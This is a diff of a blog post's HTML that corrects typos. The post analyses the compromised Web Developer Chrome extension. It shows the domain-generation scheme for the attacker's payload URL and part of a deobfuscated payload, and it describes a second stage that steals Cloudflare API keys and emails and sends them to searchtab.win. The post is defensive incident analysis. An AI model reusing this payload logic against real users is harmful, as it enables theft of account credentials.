@@ -82,7 +82,7 @@
       
 
 <p>Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I
-quickly began to wonder about the what and how.Several stroies exist about how the extension came
+quickly began to wonder about the what and how. Several stories exist about how the extension came
 to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I
 believe to be, the more nefarious behavior of the extension. Since the extension calls out to an
 attacker-controlled URL, the payload hosted at that URL could be changed to <em>anything</em> at any time.</p>
@@ -101,7 +101,7 @@ https://wd + md5(4-8-2017) + .win/ga.js
 https://wdfefe6195a8b014a1cc7d9cf2449d1b50.win/ga.js
 </code></pre>
 
-<p>This payload is fetched on every page that a victim navigates to.  The payload is encoded and
+<p>The following payload is fetched on every page that a victim navigates to. The payload is encoded and
 minified. Expanding it reveals the following portion:</p>
 
 <pre><code class="language-javascript.prettyprint">if (top['location']['href']['indexOf']('cloudflare.com') &gt; -1) {
@@ -139,12 +139,12 @@ xmlhttp.send(null);
 <p>This second-stage payload <code>GET</code>s the logged in user&rsquo;s API key then sends it, and the user&rsquo;s email,
 along to the <code>searchtab.win</code> domain.</p>
 
-<p>This was clearly a targetted attack against professional Web Developers. Web Developers will
+<p>This was clearly a targeted attack against professional Web Developers. Web Developers will
 sometimes have access to production accounts on their employer&rsquo;s infrastructure. Though more common
 in smaller companies that don&rsquo;t have dedicated DevOps and/or Security teams, it&rsquo;s not impossible
 for bigger companies to fall prey.</p>
 
-<p>With a valid API token, attackers could control a company&rsquo;s public-facing infrastructture and
+<p>With a valid API token, attackers could control a company&rsquo;s public-facing infrastructure and
 create or modify sub/domains.</p>
 
 <p>We&rsquo;ve currently blocked all outgoing requests to <code>*.win/ga.js</code> and asked our developers to update
